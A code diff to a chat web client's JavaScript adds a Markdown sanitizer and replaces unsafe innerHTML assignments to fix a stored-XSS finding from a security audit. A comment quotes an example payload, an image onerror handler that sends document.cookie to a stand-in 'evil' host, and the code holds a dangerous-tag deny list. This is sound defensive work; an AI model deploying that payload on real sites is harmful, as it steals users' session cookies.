@@ -1,6 +1,58 @@
 // app/web/static/js/chat.js
 const $ = (id) => document.getElementById(id);
 
+// --- Safe Markdown rendering (security audit F3) --------------------------
+// `marked` passes raw HTML straight through and ships no sanitizer, and the
+// dashboard CSP does not restrict inline event handlers, so `marked.parse(x)`
+// assigned to innerHTML is a stored-XSS sink: a chat message body like
+//   ![x](x) <img src=x onerror=fetch('//evil/'+document.cookie)>
+// authored by a co-presence peer executes in the victim's authenticated
+// session. Route EVERY marked.parse()->innerHTML through renderMarkdownSafe(),
+// which parses into an inert <template> (images don't fetch, handlers don't
+// fire there), strips dangerous elements/attributes + unsafe URL schemes, and
+// only then returns HTML for insertion. Never assign marked.parse() output to
+// innerHTML directly again.
+const _SAFE_URL_SCHEME_RE = /^(?:https?:|mailto:|tel:|#|\/|\.\/|\.\.\/|[^:]*$)/i;
+const _DANGEROUS_TAGS = new Set([
+  "script", "iframe", "object", "embed", "link", "meta",
+  "style", "base", "form", "frame", "frameset", "template",
+]);
+
+function _sanitizeFragment(root) {
+  root.querySelectorAll("*").forEach((el) => {
+    if (_DANGEROUS_TAGS.has(el.tagName.toLowerCase())) {
+      el.remove();
+      return;
+    }
+    for (const attr of Array.from(el.attributes)) {
+      const name = attr.name.toLowerCase();
+      const value = attr.value || "";
+      // Drop all inline event handlers (onerror=, onload=, onclick=, …).
+      if (name.startsWith("on")) {
+        el.removeAttribute(attr.name);
+        continue;
+      }
+      // Constrain URL-bearing attributes to safe schemes; kill srcset entirely.
+      if (name === "href" || name === "src" || name === "xlink:href") {
+        if (!_SAFE_URL_SCHEME_RE.test(value.trim())) el.removeAttribute(attr.name);
+      } else if (name === "srcset") {
+        el.removeAttribute(attr.name);
+      } else if (name === "style" && /url\s*\(|expression|javascript:/i.test(value)) {
+        el.removeAttribute(attr.name);
+      }
+    }
+  });
+  return root;
+}
+
+function renderMarkdownSafe(text) {
+  const tpl = document.createElement("template");
+  // Parsing into a <template> is inert: no network fetches, no handler firing.
+  tpl.innerHTML = marked.parse(text || "");
+  _sanitizeFragment(tpl.content);
+  return tpl.innerHTML;
+}
+
 let ws = null;
 let currentChatId = null;
 let inFlightToolCalls = new Map();
@@ -785,7 +837,7 @@ function renderMessage(m) {
   const article = createMessageShell({ role: m.role, createdAt: m.created_at });
   const bubble = article.querySelector(".msg-bubble");
   const body = bubble.querySelector(".msg-body");
-  body.innerHTML = marked.parse(m.content || "");
+  body.innerHTML = renderMarkdownSafe(m.content || "");
   enhanceCodeBlocks(body);
   enhanceTables(body);
 
@@ -803,8 +855,16 @@ function renderMessage(m) {
   if (m.tool_calls && m.tool_calls.length) {
     for (const tc of m.tool_calls) {
       const det = document.createElement("details");
-      det.innerHTML = `<summary>tool: ${tc.tool}</summary>
-        <pre><code>${JSON.stringify(tc.args, null, 2)}</code></pre>`;
+      // F3: build via textContent, not innerHTML — tc.tool / tc.args are
+      // untrusted and were previously interpolated into innerHTML unescaped.
+      const summary = document.createElement("summary");
+      summary.textContent = `tool: ${tc.tool}`;
+      const pre = document.createElement("pre");
+      const code = document.createElement("code");
+      code.textContent = JSON.stringify(tc.args, null, 2);
+      pre.appendChild(code);
+      det.appendChild(summary);
+      det.appendChild(pre);
       bubble.appendChild(det);
       enhanceCodeBlocks(det);
     }
@@ -1080,7 +1140,7 @@ function finalizeAssistantMessage(frame) {
   const content = (frame && frame.content) || currentAssistantText;
   if (currentAssistantArticle && currentAssistantBody) {
     currentAssistantArticle.classList.remove("is-streaming");
-    currentAssistantBody.innerHTML = marked.parse(content);
+    currentAssistantBody.innerHTML = renderMarkdownSafe(content);
     enhanceCodeBlocks(currentAssistantBody);
     enhanceTables(currentAssistantBody);
     attachMessageActions(currentAssistantArticle, content);
@@ -1302,7 +1362,7 @@ function _renderToolResultPreview(result) {
     const previewBody = document.createElement("div");
     previewBody.className = "cloud-chat-tool-result-preview";
     try {
-      previewBody.innerHTML = marked.parse(preview);
+      previewBody.innerHTML = renderMarkdownSafe(preview);
       enhanceCodeBlocks(previewBody);
       enhanceTables(previewBody);
     } catch (_) {
@@ -1319,7 +1379,7 @@ function _renderToolResultPreview(result) {
       const full = document.createElement("div");
       full.className = "cloud-chat-tool-result-full-body";
       try {
-        full.innerHTML = marked.parse(result);
+        full.innerHTML = renderMarkdownSafe(result);
         enhanceCodeBlocks(full);
         enhanceTables(full);
       } catch (_) {
